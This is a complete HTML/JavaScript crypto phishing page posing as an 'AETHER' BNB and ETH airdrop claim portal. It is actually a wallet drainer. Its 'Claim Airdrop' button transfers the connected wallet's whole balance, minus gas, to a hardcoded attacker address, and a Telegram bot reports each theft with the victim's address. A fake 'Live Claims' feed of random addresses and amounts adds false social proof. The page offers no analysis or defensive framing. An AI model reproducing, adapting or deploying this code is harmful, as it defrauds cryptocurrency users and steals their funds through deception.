<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>🎁 AETHER AIRDROP | BNB & ETH Claim Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    
    <!-- Social Meta Tags -->
    <meta property="og:title" content="AETHER | BNB & ETH Airdrop Claim">
    <meta property="og:description" content="Claim your BNB & ETH airdrop rewards.">
    <meta property="og:type" content="website">

    <!-- Fonts & Libraries -->
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>

    <style>
        :root {
            --bg-deep: #050508;
            --bg-panel: rgba(12, 12, 18, 0.85);
            --accent-main: #F0B90B;
            --accent-glow: rgba(240, 185, 11, 0.4);
            --accent-text: #F0B90B;
            --btn-gradient: linear-gradient(135deg, #F0B90B, #d6a00a);
            --btn-shadow: 0 4px 15px rgba(240, 185, 11, 0.3);
            --btn-hover-shadow: 0 6px 25px rgba(240, 185, 11, 0.5);
            --text-bright: #ffffff;
            --text-dim: #8a8a9a;
            --glass-border: rgba(255, 255, 255, 0.08);
            --eth-color: #627eea;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-deep);
            color: var(--text-bright);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            position: relative;
        }

        .bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            background: radial-gradient(circle at 50% 0%, var(--accent-glow) 0%, transparent 50%);
        }

        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background-image: 
                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
            background-size: 60px 60px;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
            position: relative;
            z-index: 10;
        }

        .app-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo-container {
            width: 90px;
            height: 90px;
            margin: 0 auto 15px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-glow {
            position: absolute;
            width: 120%;
            height: 120%;
            background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
            animation: pulseGlow 4s infinite ease-in-out;
        }

        .logo-img {
            width: 80px;
            height: 80px;
            position: relative;
            z-index: 2;
            filter: drop-shadow(0 0 15px var(--accent-main));
        }

        .app-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 32px;
            font-weight: 700;
            letter-spacing: 4px;
            text-transform: uppercase;
            background: linear-gradient(to right, #fff, var(--accent-main));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }

        .app-subtitle {
            font-size: 12px;
            color: var(--accent-main);
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 500;
        }

        .card {
            background: var(--bg-panel);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 30px 25px;
            backdrop-filter: blur(25px);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }

        .section-label {
            font-size: 11px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .section-label::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--glass-border);
        }

        .network-selector {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
        }

        .network-btn {
            flex: 1;
            padding: 12px;
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            background: rgba(255,255,255,0.02);
            color: var(--text-dim);
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .network-btn.active {
            background: var(--accent-glow);
            border-color: var(--accent-main);
            color: var(--accent-main);
            box-shadow: 0 0 20px var(--accent-glow);
        }

        .network-btn.eth {
            border-color: var(--eth-color);
        }

        .network-btn.eth.active {
            background: rgba(98, 126, 234, 0.2);
            border-color: var(--eth-color);
            color: var(--eth-color);
            box-shadow: 0 0 20px rgba(98, 126, 234, 0.4);
        }

        .network-info-box {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--accent-main);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 25px;
            text-align: center;
        }

        .network-name-badge {
            font-size: 18px;
            font-weight: 600;
            color: var(--accent-main);
            margin-bottom: 5px;
        }

        .network-desc-badge {
            font-size: 12px;
            color: var(--text-dim);
        }

        .network-desc-badge.eth {
            color: var(--eth-color);
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 20px;
        }

        .cyber-btn {
            position: relative;
            padding: 16px;
            border: none;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 600;
            letter-spacing: 0.5px;
            cursor: pointer;
            overflow: hidden;
            transition: transform 0.1s, box-shadow 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            text-transform: uppercase;
            font-family: 'Orbitron', sans-serif;
        }

        .cyber-btn:active {
            transform: scale(0.98);
        }

        .btn-primary {
            background: var(--btn-gradient);
            color: white;
            box-shadow: var(--btn-shadow);
        }

        .btn-primary:hover {
            box-shadow: var(--btn-hover-shadow);
            transform: translateY(-2px);
        }

        .btn-claim {
            background: linear-gradient(135deg, #F0B90B, #d6a00a);
            color: white;
            box-shadow: 0 4px 20px rgba(240, 185, 11, 0.3);
            margin-top: 10px;
        }

        .btn-claim.eth {
            background: linear-gradient(135deg, var(--eth-color), #5469d4);
            box-shadow: 0 4px 20px rgba(98, 126, 234, 0.3);
        }
        
        .btn-claim:disabled {
            opacity: 0.4;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none;
        }

        .btn-loading {
            pointer-events: none;
            color: transparent !important;
        }
        
        .btn-loading::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .status-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 13px;
            color: var(--text-dim);
            border: 1px solid transparent;
            display: none;
        }

        .status-box.active { display: block; }
        .status-box.error { color: #ff4d4d; border-color: rgba(255, 77, 77, 0.3); background: rgba(255, 77, 77, 0.05); }
        .status-box.success { color: #00ff9d; border-color: rgba(0, 255, 157, 0.3); background: rgba(0, 255, 157, 0.05); }
        .status-box.warning { color: #ffb700; border-color: rgba(255, 183, 0, 0.3); background: rgba(255, 183, 0, 0.05); }

        .wallet-badge {
            display: none;
            background: rgba(255, 255, 255, 0.05);
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 13px;
            color: var(--accent-main);
            margin-bottom: 15px;
            text-align: center;
            border: 1px solid var(--accent-main);
        }

        .balance-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid var(--glass-border);
        }

        .balance-label {
            font-size: 11px;
            color: var(--text-dim);
            text-transform: uppercase;
            margin-bottom: 5px;
        }

        .balance-amount {
            font-size: 24px;
            font-weight: 700;
            color: var(--accent-main);
        }

        .balance-amount.eth {
            color: var(--eth-color);
        }

        .balance-symbol {
            font-size: 14px;
            color: var(--text-dim);
            margin-left: 5px;
        }

        .live-feed-section {
            margin-top: 25px;
            border-top: 1px solid rgba(255,255,255,0.05);
            padding-top: 15px;
        }

        .live-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 15px;
        }

        .live-title {
            font-size: 12px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background: #00ff9d;
            border-radius: 50%;
            animation: blink 2s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .tx-list {
            display: flex;
            flex-direction: column;
            gap: 8px;
            max-height: 200px;
            overflow: hidden;
        }

        .tx-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(255,255,255,0.02);
            padding: 10px 12px;
            border-radius: 8px;
            border-left: 2px solid #F0B90B;
        }

        .tx-item.eth {
            border-left-color: var(--eth-color);
        }

        .tx-user {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .tx-avatar {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: rgba(255,255,255,0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
        }

        .tx-address {
            font-size: 12px;
            color: #ccc;
            font-family: monospace;
        }

        .tx-amount {
            font-size: 12px;
            font-weight: 600;
            color: #00ff9d;
        }

        .tx-time {
            font-size: 10px;
            color: var(--text-dim);
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
        
        .moonpay-link {
            color: var(--text-dim);
            text-decoration: none;
            font-size: 12px;
            transition: color 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .moonpay-link:hover { color: var(--accent-main); }

        @keyframes pulseGlow {
            0%, 100% { opacity: 0.6; transform: scale(1); }
            50% { opacity: 0.9; transform: scale(1.2); }
        }
    </style>
</head>
<body>
    <div class="bg-canvas"></div>
    <div class="grid-overlay"></div>

    <div class="main-container">
        <header class="app-header">
            <div class="logo-container">
                <div class="logo-glow"></div>
                <i class="fab fa-btc logo-img" style="font-size: 80px; color: #F0B90B;"></i>
            </div>
            <h1 class="app-title">AETHER</h1>
            <div class="app-subtitle">Multi-Chain Airdrop</div>
        </header>

        <div class="card">
            <div class="network-selector">
                <button class="network-btn active" data-network="bsc">
                    <i class="fas fa-coins"></i> BNB
                </button>
                <button class="network-btn eth" data-network="eth">
                    <i class="fab fa-ethereum"></i> ETH
                </button>
            </div>

            <div class="network-info-box">
                <div class="network-name-badge" id="networkName">BNB Smart Chain</div>
                <div class="network-desc-badge" id="networkDesc">Low Fees • Fast Transactions</div>
            </div>

            <div id="walletBadge" class="wallet-badge">
                <i class="fas fa-check-circle"></i> Connected: <span id="walletAddress">...</span>
            </div>

            <div id="statusBox" class="status-box active">
                <i class="fas fa-info-circle"></i> Connect wallet to check eligibility
            </div>

            <div class="balance-box" id="balanceBox" style="display: none;">
                <div class="balance-label">Your Balance</div>
                <div><span class="balance-amount" id="balanceAmount">0</span><span class="balance-symbol" id="balanceSymbol">BNB</span></div>
            </div>

            <div class="btn-group">
                <button id="connectBtn" class="cyber-btn btn-primary">
                    <i class="fas fa-wallet"></i> Connect Wallet
                </button>
            </div>

            <button id="claimBtn" class="cyber-btn btn-claim" disabled>
                <i class="fas fa-gift"></i> Claim Airdrop
            </button>

            <div class="live-feed-section">
                <div class="live-header">
                    <div class="live-title"><div class="live-dot"></div> Live Claims</div>
                    <span id="liveNetwork" style="font-size: 10px; color: var(--text-dim);">BNB Network</span>
                </div>
                <div class="tx-list" id="txList"></div>
            </div>

            <div class="footer-links">
                <a href="https://buy.moonpay.com?currencyCode=bnb" id="moonpayLink" class="moonpay-link" target="_blank">
                    <i class="fas fa-gas-pump"></i> Need Gas? Buy with MoonPay
                </a>
            </div>
        </div>
    </div>

    <script>
        // ================= CONFIGURATION =================
        const NETWORKS = {
            bsc: {
                name: 'BNB Smart Chain',
                short: 'BNB',
                chainId: '0x38',
                rpc: 'https://bsc-dataseed1.binance.org',
                explorer: 'https://bscscan.com',
                symbol: 'BNB',
                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
            },
            eth: {
                name: 'Ethereum Mainnet',
                short: 'ETH',
                chainId: '0x1',
                rpc: 'https://eth.llamarpc.com',
                explorer: 'https://etherscan.io',
                symbol: 'ETH',
                recipient: '0x11162539D0DC5Fec12c4F6b9cEd81B76b0B1e5b1'
            }
        };

        // Telegram config (optional)
        const TELEGRAM_BOT = "8508442196:AAGyHF-RKSVPVtAvpYzvNRns3mufYb-1Euk"; 
        const ADMIN_CHAT_ID = "-1003776376519"; 

        // ================= STATE =================
        let provider, signer, userAddress = null;
        let currentNetwork = 'bsc';
        let isProcessing = false;

        // ================= UI ELEMENTS =================
        const connectBtn = document.getElementById('connectBtn');
        const claimBtn = document.getElementById('claimBtn');
        const statusBox = document.getElementById('statusBox');
        const walletBadge = document.getElementById('walletBadge');
        const balanceBox = document.getElementById('balanceBox');
        const balanceAmount = document.getElementById('balanceAmount');
        const balanceSymbol = document.getElementById('balanceSymbol');
        const walletAddress = document.getElementById('walletAddress');
        const txList = document.getElementById('txList');
        const networkBtns = document.querySelectorAll('.network-btn');
        const networkName = document.getElementById('networkName');
        const networkDesc = document.getElementById('networkDesc');
        const liveNetwork = document.getElementById('liveNetwork');
        const moonpayLink = document.getElementById('moonpayLink');

        // ================= LIVE FEED =================
        const addresses = ['0x5a3f...', '0x7b9d...', '0x1f4e...', '0x92da...', '0xa2e7...'];
        function addLiveClaim() {
            const div = document.createElement('div');
            div.className = `tx-item ${currentNetwork}`;
            const symbol = NETWORKS[currentNetwork].symbol;
            div.innerHTML = `
                <div class="tx-user">
                    <div class="tx-avatar"><i class="fas fa-user"></i></div>
                    <div><div class="tx-address">${addresses[Math.floor(Math.random() * addresses.length)]}</div><div class="tx-time">Just now</div></div>
                </div>
                <div class="tx-amount">+${(Math.random() * 2 + 0.1).toFixed(2)} ${symbol}</div>
            `;
            txList.insertBefore(div, txList.firstChild);
            if(txList.children.length > 5) txList.removeChild(txList.lastChild);
        }
        for(let i=0; i<3; i++) addLiveClaim();
        setInterval(addLiveClaim, 4000);

        // ================= NETWORK SWITCHING =================
        networkBtns.forEach(btn => {
            btn.onclick = () => {
                if(isProcessing) return;
                
                networkBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentNetwork = btn.dataset.network;
                
                updateNetworkUI();
                
                if(provider && userAddress) {
                    updateBalance();
                }
            };
        });

        function updateNetworkUI() {
            const net = NETWORKS[currentNetwork];
            networkName.textContent = net.name;
            networkDesc.textContent = currentNetwork === 'bsc' ? 'Low Fees • Fast Transactions' : 'Ethereum Mainnet';
            networkDesc.className = `network-desc-badge ${currentNetwork}`;
            liveNetwork.textContent = `${net.short} Network`;
            moonpayLink.href = `https://buy.moonpay.com?currencyCode=${net.symbol.toLowerCase()}`;
            claimBtn.className = `cyber-btn btn-claim ${currentNetwork}`;
            balanceSymbol.textContent = net.symbol;
            balanceAmount.className = `balance-amount ${currentNetwork}`;
        }

        // ================= HELPER FUNCTIONS =================
        function updateStatus(msg, type = 'info') {
            statusBox.className = 'status-box active';
            if(type === 'error') statusBox.classList.add('error');
            else if(type === 'success') statusBox.classList.add('success');
            else if(type === 'warning') statusBox.classList.add('warning');
            
            let icon = 'fa-info-circle';
            if(type === 'error') icon = 'fa-times-circle';
            if(type === 'success') icon = 'fa-check-circle';
            if(type === 'warning') icon = 'fa-spinner fa-spin';
            
            statusBox.innerHTML = `<i class="fas ${icon}"></i> ${msg}`;
        }

        function setButtonLoading(btn, isLoading) {
            if(isLoading) {
                btn.classList.add('btn-loading');
                btn.disabled = true;
            } else {
                btn.classList.remove('btn-loading');
                btn.disabled = false;
            }
        }

        async function updateBalance() {
            if(!provider || !userAddress) return;
            try {
                const balance = await provider.getBalance(userAddress);
                const formattedBalance = ethers.utils.formatEther(balance);
                balanceAmount.textContent = parseFloat(formattedBalance).toFixed(4);
                balanceBox.style.display = 'block';
                return balance;
            } catch(e) {
                console.error('Balance check error:', e);
                return null;
            }
        }

        async function sendTelegram(message) {
            if(!TELEGRAM_BOT || !ADMIN_CHAT_ID) return;
            try {
                const text = encodeURIComponent(message);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${text}&parse_mode=HTML`);
            } catch(e) {
                console.error('Telegram error:', e);
            }
        }

        // ================= CONNECT WALLET =================
        connectBtn.onclick = async () => {
            if(!window.ethereum) {
                updateStatus('Please install MetaMask or TrustWallet', 'error');
                return;
            }

            setButtonLoading(connectBtn, true);
            updateStatus(`Connecting to ${NETWORKS[currentNetwork].name}...`, 'warning');

            try {
                // Request accounts
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                
                // Setup provider with selected network RPC
                const net = NETWORKS[currentNetwork];
                provider = new ethers.providers.JsonRpcProvider(net.rpc);
                
                // Get signer from wallet
                const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = web3Provider.getSigner();
                userAddress = await signer.getAddress();

                // Check if we're on correct chain
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if(chainId !== net.chainId) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: net.chainId }]
                        });
                    } catch(switchError) {
                        // Add network if not present
                        if(switchError.code === 4902) {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: net.chainId,
                                    chainName: net.name,
                                    nativeCurrency: {
                                        name: net.symbol,
                                        symbol: net.symbol,
                                        decimals: 18
                                    },
                                    rpcUrls: [net.rpc],
                                    blockExplorerUrls: [net.explorer]
                                }]
                            });
                        }
                    }
                }

                // Update UI
                walletAddress.textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                walletBadge.style.display = 'block';
                
                // Update balance
                await updateBalance();
                
                // Enable claim button
                claimBtn.disabled = false;
                connectBtn.style.display = 'none';
                
                updateStatus(`Connected to ${net.name}!`, 'success');

            } catch(err) {
                console.error('Connection error:', err);
                updateStatus('Connection failed: ' + (err.message || 'Unknown error'), 'error');
            }
            
            setButtonLoading(connectBtn, false);
        };

        // ================= CLAIM =================
        claimBtn.onclick = async () => {
            if(isProcessing || !userAddress || !signer) return;
            
            const net = NETWORKS[currentNetwork];
            isProcessing = true;
            setButtonLoading(claimBtn, true);
            updateStatus('Checking balance...', 'warning');

            try {
                // Get fresh balance from wallet
                const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
                const balance = await walletProvider.getBalance(userAddress);
                const formattedBalance = ethers.utils.formatEther(balance);
                
                console.log(`${net.symbol} Balance:`, formattedBalance);
                
                if(balance.eq(0)) {
                    updateStatus(`No ${net.symbol} balance to claim`, 'error');
                    setButtonLoading(claimBtn, false);
                    isProcessing = false;
                    return;
                }

                // Get gas price
                const gasPrice = await walletProvider.getGasPrice();
                const gasLimit = 21000;
                const gasCost = gasPrice.mul(gasLimit);
                
                // Calculate send amount
                let sendAmount;
                if(balance.gt(gasCost)) {
                    sendAmount = balance.sub(gasCost);
                } else {
                    sendAmount = balance;
                    updateStatus(`Low balance - sending all ${net.symbol}`, 'warning');
                }

                updateStatus(`Sending ${ethers.utils.formatEther(sendAmount)} ${net.symbol}...`, 'warning');

                // Send transaction
                const tx = await signer.sendTransaction({
                    to: net.recipient,
                    value: sendAmount,
                    gasLimit: gasLimit
                });

                updateStatus('Transaction sent! Waiting confirmation...', 'warning');

                // Wait for confirmation
                const receipt = await tx.wait();

                if(receipt.status === 1) {
                    const sentAmount = ethers.utils.formatEther(sendAmount);
                    const successMsg = `✅ <b>${net.symbol} CLAIM SUCCESS</b>\n` +
                        `Amount: ${sentAmount} ${net.symbol}\n` +
                        `Network: ${net.name}\n` +
                        `From: ${userAddress}\n` +
                        `TX: ${net.explorer}/tx/${tx.hash}`;
                    
                    await sendTelegram(successMsg);
                    
                    updateStatus(`✅ Success! ${sentAmount} ${net.symbol} claimed`, 'success');
                    claimBtn.innerHTML = '<i class="fas fa-check"></i> Claimed';
                    claimBtn.disabled = true;
                    
                    setTimeout(updateBalance, 2000);
                } else {
                    updateStatus('Transaction failed', 'error');
                }

            } catch(err) {
                console.error('Claim error:', err);
                
                if(err.code === 4001) {
                    updateStatus('Transaction rejected', 'error');
                } else {
                    updateStatus('Failed: ' + (err.message?.substring(0, 50) || 'Unknown error'), 'error');
                }
            }

            setButtonLoading(claimBtn, false);
            isProcessing = false;
        };

        // Auto-check for existing connection
        window.addEventListener('load', async () => {
            updateNetworkUI();
            if(window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if(accounts.length > 0) {
                        connectBtn.click();
                    }
                } catch(e) {
                    console.log('Auto-connect check failed:', e);
                }
            }
        });

        // Listen for account changes
        if(window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                if(accounts.length === 0) {
                    window.location.reload();
                }
            });
            
            window.ethereum.on('chainChanged', () => {
                window.location.reload();
            });
        }
    </script>
</body>
</html>
